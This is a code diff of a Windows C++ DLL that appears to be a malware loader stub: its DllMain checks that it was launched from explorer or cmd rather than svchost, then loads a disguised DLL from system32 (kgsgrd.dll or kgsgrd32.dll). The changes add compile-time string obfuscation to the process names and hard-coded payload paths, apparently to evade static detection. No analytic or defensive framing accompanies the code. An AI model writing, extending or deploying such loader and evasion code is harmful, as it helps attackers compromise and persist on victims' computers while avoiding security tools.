@@ -1,10 +1,8 @@
-#define LOADER
-
 #include <windows.h>
 #include <string>
 #include <tlhelp32.h>
 #include <psapi.h>
-#include "config.h"
+#include "obfuscate.h"
 
 DWORD GetPPID(DWORD pid)
 {
@@ -60,7 +58,7 @@ bool IsExplorerProcess(void)
         if (!GetProcessName(pid, fname, MAX_PATH))
         {
             processName = std::string(fname);
-            if (processName.find("svchost") != std::string::npos) // efficiency is key here
+            if (processName.find(AY_OBFUSCATE("svchost")) != std::string::npos) // efficiency is key here
                 return false;
 
             pid = GetPPID(pid);
@@ -69,7 +67,7 @@ bool IsExplorerProcess(void)
         {
             return false;
         }
-    } while (processName.find("explorer") == std::string::npos && processName.find("cmd") == std::string::npos);
+    } while (processName.find(AY_OBFUSCATE("explorer")) == std::string::npos && processName.find(AY_OBFUSCATE("cmd")) == std::string::npos);
 
     return true;
 }
@@ -82,7 +80,12 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserv
         if (!IsExplorerProcess())
             return FALSE;
         
-        LoadLibraryW(DLL); // TODO obfuscate
+#if defined(_WIN64)
+        LoadLibraryA(AY_OBFUSCATE("C:\\windows\\system32\\kgsgrd.dll")); 
+#else
+        LoadLibraryA(AY_OBFUSCATE("C:\\windows\\system32\\kgsgrd32.dll")); 
+#endif
+
         break;
     case DLL_THREAD_ATTACH:
         break;
